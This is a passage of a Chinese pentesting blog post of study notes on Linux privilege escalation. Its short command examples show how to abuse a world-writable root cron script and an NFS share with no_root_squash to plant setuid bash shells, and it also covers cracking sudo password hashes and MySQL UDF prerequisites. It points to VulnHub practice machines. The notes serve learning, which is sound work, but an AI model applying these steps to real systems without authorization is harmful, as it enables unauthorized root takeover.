+<p>运行后输入密码进行提权：</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212044127-654163967.webp" alt="img"></p>
+<h5 id="3linux-exploit-suggester"><a class="markdownIt-Anchor" href="#3linux-exploit-suggester">#</a> （3）linux-exploit-suggester</h5>
+<p>要出网查 poc，暂时不整理</p>
+<h3 id="3-计划任务提权"><a class="markdownIt-Anchor" href="#3-计划任务提权">#</a> 3 计划任务提权</h3>
+<p>系统内可能会有一些定时执行的任务，一般这些任务由 crontab 来管理，具有所属用户的权限。非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出。</p>
+<p>利用命令如下命令列出一些计划任务</p>
+<pre><code>ls -l /etc/cron*
+
+cat /etc/crontab
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049570-772756241.webp" alt="img"></p>
+<p>在发现有一些计划任务时，我们就可以去检查是否存在一些问题导致权限的提升</p>
+<p>权限配置不当，例如：</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212049975-2144042977.webp" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://xn--roottest-z09lrnp1fu6xurk1wo342giqj799e07xad1e.sh">发现存在一个 root 身份运行的 test.sh</a>，那我们当相应的目录下去查看一下这个计划任务</p>
+<pre><code>cd /sbin;ls -l test.sh
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050205-1914296344.webp" alt="img"></p>
+<p>发现这里权限配置为 777，就是说我们普通用户也能去修改这个 test.sh 文件，那我们对文件进行修改，然后进行提权。</p>
+<pre><code>cp /bin/bash /tmp/bash; chmod u+s /tmp/bash;
+</code></pre>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050438-1720194396.webp" alt="img"></p>
+<p>接下来就到 /tmp 等待计划任务的执行</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050685-1766592938.webp" alt="img"></p>
+<p>产生后对 bash 文件进行执行即可进行提权</p>
+<p><img src="/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819212050956-1947031195.webp" alt="img"></p>
+<h3 id="4-sudo提权"><a class="markdownIt-Anchor" href="#4-sudo提权">#</a> 4 sudo 提权</h3>
+<h4 id="1免密码"><a class="markdownIt-Anchor" href="#1免密码">#</a> （1）免密码</h4>
+<h4 id="2密码爆破"><a class="markdownIt-Anchor" href="#2密码爆破">#</a> （2）密码爆破</h4>
+<pre><code>john --user-test test.hash
+</code></pre>
+<h3 id="5-密码复用"><a class="markdownIt-Anchor" href="#5-密码复用">#</a> 5 密码复用</h3>
+<p>字面意思</p>
+<h3 id="6-nfs提权"><a class="markdownIt-Anchor" href="#6-nfs提权">#</a> 6 NFS 提权</h3>
+<p>当服务器中存在 NFS 共享，且开启了 no_root_squash 选项时，这时如果客户端使用的是 root 用户，那么对于共享目录来说，该客户端就有 root 权限，可以使用它来提升权限。</p>
+<p>① 查看 NFS 服务器上的共享目录</p>
+<pre><code>sudo showmount -e x.x.x.x
+</code></pre>
+<p>② 创建本地挂载目录，挂载共享目录。使用攻击者本地 root 权限创建 Suid shell。</p>
+<pre><code>sudo mkdir -p /tmp
+
+sudo mount -t nfs x.x.x.x:/home/test /tmp
+
+cp /bin/bash /tmp/shell
+
+chmod u+s /tmp/shell
+</code></pre>
+<p>③ 回到要提权的服务器上，使用普通用户使用 shell -p 来获取 root 权限。</p>
+<h3 id="7-数据库提权"><a class="markdownIt-Anchor" href="#7-数据库提权">#</a> 7 数据库提权</h3>
+<h4 id="1udf提权"><a class="markdownIt-Anchor" href="#1udf提权">#</a> （1）UDF 提权</h4>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF 提权篇】 - FreeBuf 网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/675466196">linux 环境下的 MySQL UDF 提权 - 知乎 (zhihu.com)</a></p>
+<h5 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍：</h5>
+<p>​		UDF（user defind function）用户自定义函数，通过添加新函数，对 MySQL 的功能进行扩充。调用方式与一般系统自带的函数相同，例如 user ()，version () 等函数。</p>
+<p>​		udf 文件后缀在 windows 与 linux 系统下分别为 dll 与 so，即动态链接库文件，由 C、C++ 编写。</p>
+<h5 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件">#</a> 利用条件：</h5>
+<p>1、常规情况：</p>
+<ul>
+<li>
+<p>mysql 配置文件 secure_file_priv 项设置为空，（如果为 NULL 或 /tmp/ 等指定目录，即无法自定义 udf 文件导出位置，则无法利用）；</p>
+</li>
+<li>
+<p>CREATE 权限、FILE 权限（root 用户默认拥有所有权限）。</p>
+</li>
+</ul>
+<p>2、特殊情况：</p>
+<ul>
+<li>INSERT 权限、UPDATE 权限、DELETE 权限。</li>
+</ul>
+<p>查看当前数据库用户权限：</p>
+<pre><code>select * from mysql.user where user = substring_index(user(), '@', 1)\G;
+</code></pre>
+<h5 id="版本特性"><a class="markdownIt-Anchor" href="#版本特性">#</a> 版本特性</h5>
+<p>udf 提权操作中的一个步骤是将我们的 udf 文件上传到 mysql 的检索目录中，Windows 系统下 mysql 各版本的检索目录有所不同：</p>
+<h4 id="2mof提权"><a class="markdownIt-Anchor" href="#2mof提权">#</a> （2）MOF 提权</h4>
+<h4 id="3启动项提权"><a class="markdownIt-Anchor" href="#3启动项提权">#</a> （3）启动项提权</h4>
+<h4 id="4cve-2016-6663-cve-2016-6664组合提权"><a class="markdownIt-Anchor" href="#4cve-2016-6663-cve-2016-6664组合提权">#</a> （4）CVE-2016-6663、CVE-2016-6664 组合提权</h4>
+<h4 id="5反弹端口提权"><a class="markdownIt-Anchor" href="#5反弹端口提权">#</a> （5）反弹端口提权</h4>
+<h2 id="题目"><a class="markdownIt-Anchor" href="#题目">#</a> 题目</h2>
+<p>这道题应该是专门练提权的：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/42challenge-1,465/">42Challenge: 1 ~ VulnHub</a></p>
+<p>windows：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/277954.html">内网渗透基石篇–权限提升（上） - FreeBuf 网络安全行业门户</a></p>
+<p>linux 内核：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29864185/article/details/107154916">渗透测试 — 提权方式总结_渗透提权 - CSDN 博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15163907.html">最详细 Linux 提权总结（建议收藏） - 随风 kali - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15162635.html">最全 Windows 提权总结（建议收藏） - 随风 kali - 博客园 (cnblogs.com)</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>Moyao
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://demoyao100.github.io/%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" title="渗透提权总结">https://demoyao100.github.io/渗透提权总结/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pentesting/" rel="tag"># pentesting</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/web-shell%E6%80%BB%E7%BB%93/" rel="prev" title="web shell总结">
+                  <i class="fa fa-angle-left"></i> web shell总结
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    © 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Moyao</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> &amp; <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+
+
+</body></html>
